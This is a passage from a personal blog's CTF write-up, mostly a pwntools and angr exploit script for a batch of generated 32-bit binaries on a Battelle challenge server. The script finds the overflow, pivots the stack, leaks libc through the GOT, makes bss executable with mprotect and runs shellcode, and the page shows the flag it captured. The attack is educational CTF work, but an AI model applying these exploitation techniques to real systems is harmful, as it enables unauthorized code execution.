</span><span>  </span><span style="color:#ffd580;">close</span><span>(__fd)</span><span style="color:#ccc9c2cc;">;
</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
</span><span>  </span><span style="color:#f28779;">exit</span><span>(</span><span style="color:#ffcc66;">0x2c</span><span>)</span><span style="color:#ccc9c2cc;">;
</span><span>}
</span></code></pre>
<p>I learned from an admin that the intended solution was <a href="https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve">ret2dlresolve</a> -- the binary had no plt stub for this function so it couldn't be called directly, but if you forged one the linker would happily fetch a pointer to this function for you.</p>
<p>I, being incredibly lazy, chose to just fake this function by writing DONE to the log file in my rop chain. sorry ;)</p>
<h2 id="tying-it-all-together">tying it all together</h2>
<p>As I had an 100% accurate ret2libc chain it didn't take much to finish up the challenge. I modified the end of my chain to mprotect and write shellcode which mimicked the holy grail function, wrapped it in a loop, and let it run.</p>
<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
</span><span style="color:#ffa759;">import </span><span>time</span><span style="color:#ccc9c2cc;">, </span><span>angr</span><span style="color:#ccc9c2cc;">, </span><span>logging
</span><span>
</span><span>logging</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">getLogger</span><span>(</span><span style="color:#bae67e;">&#39;angr&#39;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">setLevel</span><span>(</span><span style="color:#bae67e;">&#39;ERROR&#39;</span><span>)
</span><span>logging</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">getLogger</span><span>(</span><span style="color:#bae67e;">&#39;claripy&#39;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">setLevel</span><span>(</span><span style="color:#bae67e;">&#39;ERROR&#39;</span><span>)
</span><span>
</span><span>context</span><span style="color:#f29e74;">.</span><span>terminal </span><span style="color:#f29e74;">= </span><span>[</span><span style="color:#bae67e;">&#39;kitty&#39;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&#39;-e&#39;</span><span>]
</span><span>
</span><span>r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;ctf.battelle.org&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">30042</span><span>)
</span><span>
</span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">5</span><span>):
</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;solving binary </span><span>{i}</span><span style="color:#bae67e;">&quot;</span><span>)
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;********************************&quot;</span><span>)
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()
</span><span>    </span><span style="color:#ffa759;">with </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;current_binary&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;wb&quot;</span><span>) </span><span style="color:#ffa759;">as </span><span>f:
</span><span>        f</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;********************************</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>))
</span><span>
</span><span>    p </span><span style="color:#f29e74;">= </span><span>angr</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">Project</span><span>(</span><span style="color:#bae67e;">&quot;current_binary&quot;</span><span>)
</span><span>    state </span><span style="color:#f29e74;">= </span><span>p</span><span style="color:#f29e74;">.</span><span>factory</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">blank_state</span><span>()
</span><span>
</span><span>    simgr </span><span style="color:#f29e74;">= </span><span>p</span><span style="color:#f29e74;">.</span><span>factory</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">simgr</span><span>(state</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">save_unconstrained</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">True</span><span>)
</span><span>    simgr</span><span style="color:#f29e74;">.</span><span>stashes[</span><span style="color:#bae67e;">&#39;mem_corrupt&#39;</span><span>]  </span><span style="color:#f29e74;">= </span><span>[]
</span><span>    
</span><span>    </span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">check_mem_corruption</span><span>(</span><span style="color:#ffcc66;">simgr</span><span>):
</span><span>        </span><span style="color:#ffa759;">if </span><span style="color:#f28779;">len</span><span>(simgr</span><span style="color:#f29e74;">.</span><span>unconstrained):
</span><span>            </span><span style="color:#ffa759;">for </span><span>path </span><span style="color:#ffa759;">in </span><span>simgr</span><span style="color:#f29e74;">.</span><span>unconstrained:
</span><span>                </span><span style="color:#ffa759;">if </span><span>path</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">satisfiable</span><span>(</span><span style="color:#ffcc66;">extra_constraints</span><span style="color:#f29e74;">=</span><span>[path</span><span style="color:#f29e74;">.</span><span>regs</span><span style="color:#f29e74;">.</span><span>pc </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;ABCD&quot;</span><span>]):
</span><span>                    path</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">add_constraints</span><span>(path</span><span style="color:#f29e74;">.</span><span>regs</span><span style="color:#f29e74;">.</span><span>pc </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;ABCD&quot;</span><span>)
</span><span>                    </span><span style="color:#ffa759;">if </span><span>path</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">satisfiable</span><span>():
</span><span>                        simgr</span><span style="color:#f29e74;">.</span><span>stashes[</span><span style="color:#bae67e;">&#39;mem_corrupt&#39;</span><span>]</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">append</span><span>(path)
</span><span>                    simgr</span><span style="color:#f29e74;">.</span><span>stashes[</span><span style="color:#bae67e;">&#39;unconstrained&#39;</span><span>]</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">remove</span><span>(path)
</span><span>                    simgr</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">drop</span><span>(</span><span style="color:#ffcc66;">stash</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&#39;active&#39;</span><span>)
</span><span>        </span><span style="color:#ffa759;">return </span><span>simgr
</span><span>
</span><span>    simgr</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">explore</span><span>(</span><span style="color:#ffcc66;">step_func</span><span style="color:#f29e74;">=</span><span>check_mem_corruption)
</span><span>    </span><span style="color:#ffa759;">if </span><span style="color:#f28779;">len</span><span>(simgr</span><span style="color:#f29e74;">.</span><span>stashes[</span><span style="color:#bae67e;">&#39;mem_corrupt&#39;</span><span>]) </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>:
</span><span>        log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">warn</span><span>(</span><span style="color:#bae67e;">&quot;could not find memory corrupting input&quot;</span><span>)
</span><span>        </span><span style="color:#ffd580;">exit</span><span>(</span><span style="color:#ffcc66;">1</span><span>)
</span><span>    corrupting </span><span style="color:#f29e74;">= </span><span>simgr</span><span style="color:#f29e74;">.</span><span>stashes[</span><span style="color:#bae67e;">&#39;mem_corrupt&#39;</span><span>][</span><span style="color:#ffcc66;">0</span><span>]</span><span style="color:#f29e74;">.</span><span>posix</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">dumps</span><span>(</span><span style="color:#ffcc66;">0</span><span>)
</span><span>    payload </span><span style="color:#f29e74;">= </span><span>corrupting[</span><span style="color:#ccc9c2cc;">:</span><span>corrupting</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">index</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;DCBA&quot;</span><span>)</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">4</span><span>]
</span><span>
</span><span>    pivoted_stack_1 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x0804b068 </span><span style="font-style:italic;color:#5c6773;"># start of bss + enough to not clobber important stuff
</span><span>
</span><span>    exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./current_binary&quot;</span><span>)
</span><span>
</span><span>
</span><span>    POP_EBX_RET </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x08048371
</span><span>    POP_EBX_RET </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x08048371
</span><span>    MOV_AX_4 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x080484f7
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># above gadgets are constant
</span><span>    POP_EBP_RET </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">next</span><span>(exe</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\x5d\xc3</span><span style="color:#bae67e;">&quot;</span><span>))
</span><span>    INC_ECX_RET </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">next</span><span>(exe</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\x41\xc3</span><span style="color:#bae67e;">&quot;</span><span>))
</span><span>    LEAVE_RET </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">next</span><span>(exe</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\xc9\xc3</span><span style="color:#bae67e;">&quot;</span><span>))
</span><span>    RET </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">next</span><span>(exe</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\xc3</span><span style="color:#bae67e;">&quot;</span><span>))
</span><span>
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># the first thing we want to do is pivot the stack
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># we&#39;re gonna have to commit some sins to get this to work and limited rop chain size isn&#39;t gonna do it
</span><span>    pivot_payload </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;&quot;
</span><span>    pivot_payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p32</span><span>(</span><span style="color:#ffcc66;">0x0804b09c</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">4</span><span>)
</span><span>
</span><span>    pivot_chain </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ROP</span><span>(exe)
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># step 1 is to overwrite the last byte of the read pointer
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># I used length to leave 4 in edx for a later write because read can receive fewer than len bytes
</span><span>    pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">read</span><span>(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">, </span><span>exe</span><span style="color:#f29e74;">.</span><span>got[</span><span style="color:#bae67e;">&#39;read&#39;</span><span>]</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">4</span><span>)
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># Step 2 is to write a pointer out of the GOT, allowing me to break ASLR and determine the version of libc on the server
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># ebx/file descriptor can be set by pop ebx gadget but we need to be more inventive for other arguments
</span><span>    pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">raw</span><span>(pivot_chain</span><span style="color:#f29e74;">.</span><span>ebx[</span><span style="color:#ffcc66;">0</span><span>])
</span><span>    pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">raw</span><span>(</span><span style="color:#ffcc66;">1</span><span>)
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># ecx is already the GOT entry of read because we read over the entry
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># we lack any easy pointers to control ECX but we can increment it four times to switch to the next entry in the GOT
</span><span>    </span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">4</span><span>):
</span><span>        pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">raw</span><span>(INC_ECX_RET)
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># to write with a syscall gadget we need eax == 4
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># the only gadget I could find to do so is mov al, 4; or byte ptr [ecx], al; leave; ret; 
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># ecx at this point is the GOT entry to strlen which we can comfortably clobber because it is no longer needed
</span><span>    pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">raw</span><span>(MOV_AX_4)
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># we then increment ECX again to leak __libc_start_main
</span><span>    </span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">4</span><span>):
</span><span>        pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">raw</span><span>(INC_ECX_RET)
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># and lastly we call &quot;read&quot; which is actually a syscall gadget
</span><span>    pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">raw</span><span>(exe</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;read&#39;</span><span>])
</span><span>
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># to finish out this rop chain we need to set up for the next stage of this exploit
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># we will need to construct another rop chain with our new knowledge of libc base
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># 7 null words are garbage values which are consumed between read&#39;s syscall and ret
</span><span>    </span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">7</span><span>):
</span><span>        pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">raw</span><span>(</span><span style="color:#ffcc66;">0</span><span>)
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># these ret gadgets make the stack pointer far enough from the base that calling into the dynamic linker will not segfault
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># i ran into issues with it segfaulting because it hit the base of bss
</span><span>    </span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">100</span><span>):
</span><span>        pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">raw</span><span>(RET)
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># and lastly we use the plt stub to convince the dynamic linker into retrieving the original read pointer
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># allowing us to read again and inject a second rop chain
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># we&#39;re reading 11 * 4 bytes (size of the second pivot stack) into a location in the bss slightly after our previous rop chain ends
</span><span>    pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">call</span><span>(</span><span style="color:#ffcc66;">0x8048396</span><span style="color:#ccc9c2cc;">, </span><span>[</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0x0804b260</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">11 </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">4</span><span>])
</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#bae67e;">&quot;pivot chain created&quot;</span><span>)
</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">dump</span><span>())
</span><span>
</span><span>    pivot_payload </span><span style="color:#f29e74;">+= </span><span>pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">chain</span><span>()
</span><span>    pivot_payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p32</span><span>(pivoted_stack_1 </span><span style="color:#f29e74;">+ </span><span style="color:#f28779;">len</span><span>(pivot_payload) </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">4</span><span>) </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;/bin/bash&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">ljust</span><span>(</span><span style="color:#ffcc66;">16</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\x00</span><span style="color:#bae67e;">&quot;</span><span>)
</span><span>
</span><span>    rop </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ROP</span><span>(exe)
</span><span>    rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">read</span><span>(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">, </span><span>pivoted_stack_1</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f28779;">len</span><span>(pivot_payload))
</span><span>    rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">raw</span><span>(LEAVE_RET)
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># we override the stored ebp with pivoted_stack_1 so this will copy ebp, esp and adjust the stack to the new location
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># we previously read an arbitrarily large rop chain to that area
</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#bae67e;">&quot;first chain created&quot;</span><span>)
</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">dump</span><span>())
</span><span>
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span>(payload </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p32</span><span>(pivoted_stack_1) </span><span style="color:#f29e74;">+ </span><span>rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">chain</span><span>())
</span><span>    time</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sleep</span><span>(</span><span style="color:#ffcc66;">1</span><span>)
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span>(pivot_payload)
</span><span>    time</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sleep</span><span>(</span><span style="color:#ffcc66;">1</span><span>)
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span>(</span><span style="color:#ffd580;">p8</span><span>(</span><span style="color:#ffcc66;">244</span><span>))
</span><span>    time</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sleep</span><span>(</span><span style="color:#ffcc66;">1</span><span>)
</span><span>
</span><span>
</span><span>    libc_base </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">u32</span><span>(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recv</span><span>(</span><span style="color:#ffcc66;">4</span><span>)) </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">0x0001aa50 </span><span style="font-style:italic;color:#5c6773;"># offset of __libc_start_main
</span><span>
</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;leaked libc_base @ </span><span>{</span><span style="color:#f28779;">hex</span><span>(libc_base)}</span><span style="color:#bae67e;">&quot;</span><span>)
</span><span>
</span><span>
</span><span>    execve </span><span style="color:#f29e74;">= </span><span>libc_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x000c0470
</span><span>    mprotect </span><span style="color:#f29e74;">= </span><span>libc_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x000f5940
</span><span>    read </span><span style="color:#f29e74;">= </span><span>libc_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x000e7ea0
</span><span>
</span><span>    shellcode </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;&quot;
</span><span>    shellcode </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">asm</span><span>(shellcraft</span><span style="color:#f29e74;">.</span><span>i386</span><span style="color:#f29e74;">.</span><span>linux</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">open</span><span>(</span><span style="color:#bae67e;">&quot;./log&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">2</span><span>))
</span><span>    shellcode </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">asm</span><span>(shellcraft</span><span style="color:#f29e74;">.</span><span>i386</span><span style="color:#f29e74;">.</span><span>linux</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">echo</span><span>(</span><span style="color:#bae67e;">&quot;DONE</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">sock</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&quot;eax&quot;</span><span>))
</span><span>    shellcode </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">asm</span><span>(shellcraft</span><span style="color:#f29e74;">.</span><span>i386</span><span style="color:#f29e74;">.</span><span>linux</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">exit</span><span>(</span><span style="color:#ffcc66;">0x2c</span><span>))
</span><span>    
</span><span>
</span><span>    shellcode_loc </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x0804b284</span><span style="color:#f29e74;">+</span><span style="color:#ffcc66;">8 </span><span style="font-style:italic;color:#5c6773;"># just took the end of the rop chain and added a bit so they wouldn&#39;t run over each other
</span><span>
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># the second rop chain is created with knowledge of libc base
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># so no need to do anything tricky with read
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># I just call mprotect to make bss rwx, write shellcode, and then return to it
</span><span>    pivot_chain_2 </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ROP</span><span>(exe)
</span><span>    pivot_chain_2</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">call</span><span>(mprotect</span><span style="color:#ccc9c2cc;">, </span><span>[</span><span style="color:#ffcc66;">0x0804b000</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0x2000</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">7</span><span>])
</span><span>    pivot_chain_2</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">call</span><span>(read</span><span style="color:#ccc9c2cc;">, </span><span>[</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">, </span><span>shellcode_loc</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f28779;">len</span><span>(shellcode)])
</span><span>    pivot_chain_2</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">raw</span><span>(shellcode_loc)
</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#bae67e;">&quot;created second pivot chain&quot;</span><span>)
</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(pivot_chain_2</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">dump</span><span>())
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span>(pivot_chain_2</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">chain</span><span>())
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span>(shellcode)
</span><span>
</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
</span></code></pre>
<pre style="background-color:#212733;color:#ccc9c2;"><code><span>YOU FOUND THE HOLY GRAIL!
</span><span>flag{Y0u_f1g4t_w311_sir_knig4t_7461834}
</span></code></pre>

    </div>

    
    <div class="article-info">
        
        <div class="article-date"> 7 January 2022</div>
        
        <div class="article-taxonomies">
            
            
                <ul class="article-tags">
                    
                    <li><a href="https://tsheinen.github.io/tags/ctf-writeups/">#ctf-writeups</a></li>
                    
                </ul>
            
        </div>
    </div>

</article>

<script>
window.onscroll = function() {
    if (window.innerHeight + window.pageYOffset >= document.body.offsetHeight) {
        var count = 200;
        var defaults = {
          origin: { y: 0.7 }
        };

        function fire(particleRatio, opts) {
          confetti(Object.assign({}, defaults, opts, {
            particleCount: Math.floor(count * particleRatio)
          }));
        }

        fire(0.25, {
          spread: 26,
          startVelocity: 55,
        });
        fire(0.2, {
          spread: 60,
        });
        fire(0.35, {
          spread: 100,
          decay: 0.91,
          scalar: 0.8
        });
        fire(0.1, {
          spread: 120,
          startVelocity: 25,
          decay: 0.92,
          scalar: 1.2
        });
        fire(0.1, {
          spread: 120,
          startVelocity: 45,
        });
    }
}
</script>
<script type="text/javascript" src="/js/navbar.js"></script>


        </main>
        <footer>
            
            
        </footer>
    </div>



    <details data-popover="up" style="right: 20px;top: 20px;">
      <summary>
		  <svg class="paint-roller" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="paint-roller" class="svg-inline--fa fa-paint-roller fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M416 128V32c0-17.67-14.33-32-32-32H32C14.33 0 0 14.33 0 32v96c0 17.67 14.33 32 32 32h352c17.67 0 32-14.33 32-32zm32-64v128c0 17.67-14.33 32-32 32H256c-35.35 0-64 28.65-64 64v32c-17.67 0-32 14.33-32 32v128c0 17.67 14.33 32 32 32h64c17.67 0 32-14.33 32-32V352c0-17.67-14.33-32-32-32v-32h160c53.02 0 96-42.98 96-96v-64c0-35.35-28.65-64-64-64z"/></svg>
      </summary>
      <div class="swatch-container">
          
            <div class="swatch-child" onclick="setTheme('Dark')">
                <div style="text-align: center;">
                  <div data-theme=Dark class="swatch">
                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
                  </div>
                  <span style="color:  var(--background-color, #000000)"> Dark </span>
              </div>
            </div>
          
            <div class="swatch-child" onclick="setTheme('Light')">
                <div style="text-align: center;">
                  <div data-theme=Light class="swatch">
                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
                  </div>
                  <span style="color:  var(--background-color, #000000)"> Light </span>
              </div>
            </div>
          
      </div>
    </details>

    <!-- Cloudflare Web Analytics -->
    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "1e533cda4e344b0bb7c6bf7aef70a519"}'></script>
    <!-- End Cloudflare Web Analytics -->

    <script type="text/javascript" src="https://tsheinen.github.io/elasticlunr.min.js"></script>
    <script type="text/javascript" src="https://tsheinen.github.io/search_index.en.js"></script>
    <script type="text/javascript" src="https://tsheinen.github.io/js/search.js"></script>
</body>
</html>
